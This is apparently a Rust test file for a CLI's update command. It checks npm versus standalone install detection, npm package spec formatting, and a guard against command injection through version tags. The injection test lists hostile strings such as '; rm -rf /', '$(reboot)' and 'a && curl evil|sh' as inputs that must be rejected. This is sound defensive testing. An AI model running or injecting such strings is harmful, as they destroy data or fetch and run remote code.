use crate::cmd_update::*;
use std::path::PathBuf;

#[test]
fn npm_install_detected_via_node_modules() {
	let p = PathBuf::from("/usr/lib/node_modules/@runfile/cli/bin/linux-x64/run");
	assert_eq!(classify_install(&p), InstallKind::Npm);
}

// Backslash is a path separator only on Windows — these literals only
// split into components correctly on that target, so gate them.
#[cfg(windows)]
#[test]
fn npm_install_detected_windows_path() {
	let p = PathBuf::from(r"C:\Users\me\AppData\Roaming\npm\node_modules\@runfile\cli\bin\win32-x64\run.exe");
	assert_eq!(classify_install(&p), InstallKind::Npm);
}

#[cfg(windows)]
#[test]
fn windows_appdata_install_is_standalone() {
	let p = PathBuf::from(r"C:\Users\me\AppData\Local\runfile\bin\run.exe");
	assert_eq!(classify_install(&p), InstallKind::Standalone);
}

#[test]
fn script_install_is_standalone() {
	let p = PathBuf::from("/home/me/.local/bin/run");
	assert_eq!(classify_install(&p), InstallKind::Standalone);
}

#[test]
fn dir_named_similar_to_node_modules_is_not_npm() {
	// Only an exact `node_modules` path component counts.
	let p = PathBuf::from("/home/me/my_node_modules_backup/run");
	assert_eq!(classify_install(&p), InstallKind::Standalone);
}

#[test]
fn npm_spec_defaults_to_latest() {
	assert_eq!(npm_package_spec(None), "@runfile/cli@latest");
}

#[test]
fn npm_spec_strips_leading_v_from_tag() {
	assert_eq!(npm_package_spec(Some("v0.19.0")), "@runfile/cli@0.19.0");
}

#[test]
fn npm_spec_accepts_bare_semver() {
	assert_eq!(npm_package_spec(Some("0.19.0")), "@runfile/cli@0.19.0");
}

// ── Audit M2: version-tag validation (command-injection guard) ──

#[test]
fn valid_version_tags_accepted() {
	for v in ["v0.35.0", "0.35.0", "v1.2.3-rc.1", "latest_snapshot", "2024-01-01"] {
		assert!(is_valid_version_tag(v), "{v} should be valid");
	}
}

#[test]
fn injection_version_tags_rejected() {
	// Every one of these carries a shell metacharacter that would be
	// interpreted by the `sh -c "curl … | sh -s -- <v>"` install path.
	for v in [
		"; rm -rf /",
		"$(reboot)",
		"`id`",
		"a | sh",
		"a && curl evil|sh",
		"a b",  // whitespace
		"a\nb", // newline
		"a'b",  // quote
		"a\"b",
		"a>b",
		"", // empty
	] {
		assert!(!is_valid_version_tag(v), "{v:?} must be rejected");
	}
}

#[test]
fn overlong_version_tag_rejected() {
	assert!(!is_valid_version_tag(&"1".repeat(65)));
	assert!(is_valid_version_tag(&"1".repeat(64)));
}
